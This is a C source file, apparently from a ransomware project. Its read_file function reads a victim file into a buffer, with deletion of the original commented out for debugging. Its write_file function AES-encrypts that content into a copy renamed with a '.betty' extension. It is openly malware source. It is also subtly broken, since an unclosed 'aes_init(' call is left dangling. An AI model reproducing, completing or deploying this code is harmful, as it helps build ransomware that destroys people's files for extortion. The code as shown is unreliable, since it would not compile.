#include "fournights.h"
/**
  * read_file - reads lines from a file, and executes a function on them.
 (* TODO: Function pointer is of type char **;
 (*       NOT MODULAR.
 (*       Build a helper function to set
 (*       the right return type?
  * Deletes the file afterwards
  * @filepath: filepath to read
  * @head: head of a linked list
  * @fxn: pointer to function to enact on char buffer
  * Return: number of bytes read
 **/
size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *))
{
	size_t bytes_read = ransom->target_file_buf->bytes_read;
	FILE *fd = NULL;
	off_t file_offset = ransom->target_file_buf->file_offset;
	struct stat file_info;

	if (!filepath || !ransom)
		return(0);

	lstat(filepath, &file_info);
	ransom->target_file_buf->file_info = file_info;
	if(file_info.st_size == 0)
	{
		fprintf(stderr, "File is empty\n");
		return(0);
	}
	if ((fd = fopen(filepath, "rb")))
		fseek(fd, file_offset, SEEK_SET);
	else
		return(0);
#ifndef NO_DEBUG
	printf("\n\n----------------------------------------------\n");
	printf("st_size: %d - file_offset: %d == %d\n", (int)file_info.st_size, (int)ransom->target_file_buf->file_offset, (int)file_info.st_size - (int)ransom->target_file_buf->file_offset);
	printf("bytes_read: %d\n", (int)bytes_read);
	getchar();
#endif
	if (((int)file_info.st_size - (int)file_offset) > BIGBUF)
		bytes_read = BIGBUF;
	else
		bytes_read = (size_t)file_info.st_size - file_offset;
	fread((char *)ransom->target_file_buf->buf, bytes_read, sizeof(char), fd);
	fclose(fd);
	/* Disabled for debugging
	unlink(filepath);
	*/
	/* update tmp buffer struct to use in main. */
	ransom->target_file_buf->buf[bytes_read] = '\0';
	ransom->target_file_buf->file_offset += bytes_read;
	ransom->target_file_buf->bytes_read = bytes_read;

	/* call external function */
	if(fxn)
		fxn(ransom->target_file_buf->buf, ransom);
	return (bytes_read);
}

/**
  * write_file - writes the contents of a buffer to a file.
  * @filepath: filepath to write
  * @buffer: buffer to write into the file
  * Return: number of bytes read
 **/
char *write_file(char *buffer, ransom_t *ransom)
{
	size_t new_ext_len = 0;
	size_t filepath_len = 0;
	size_t buf_size = 0;
	size_t bytes_written = 0;
	char *new_ext = ".betty";
	char *filepath = NULL;
	FILE *fd = NULL;
	char *encrypt_buf = NULL;

	filepath = ransom->target_file_buf->filepath;
	filepath_len = my_strlen(filepath);
	/* Might need for long filepaths? linux is 4096 builtin -- the size of the buffer */
	if(filepath_len > BIGBUF)
		filepath = recalloc(filepath, BIGBUF, BIGBUF + BUFSIZE);
	new_ext_len = my_strlen(new_ext);
	buf_size = ransom->target_file_buf->bytes_read;

	if (find_substr_end(filepath, new_ext) == 0)
		my_strncat(filepath, new_ext, filepath_len, new_ext_len);

	if ((fd = fopen(filepath, "ab+")))
		fseek(fd, ransom->target_file_buf->file_offset, SEEK_SET);
	else
		return(NULL);
	/** ENCRYPT **/
	aes_init(
	encrypt_buf = encrypt_w_aes(buffer, buf_size);
	if ((bytes_written = fwrite(encrypt_buf, buf_size, sizeof(char), fd)) < 1)
		fprintf(stderr, "No bytes written\n");
	free(encrypt_buf);

	fclose(fd);
	chmod(filepath, ransom->target_file_buf->file_info.st_mode);
	return(buffer);
}
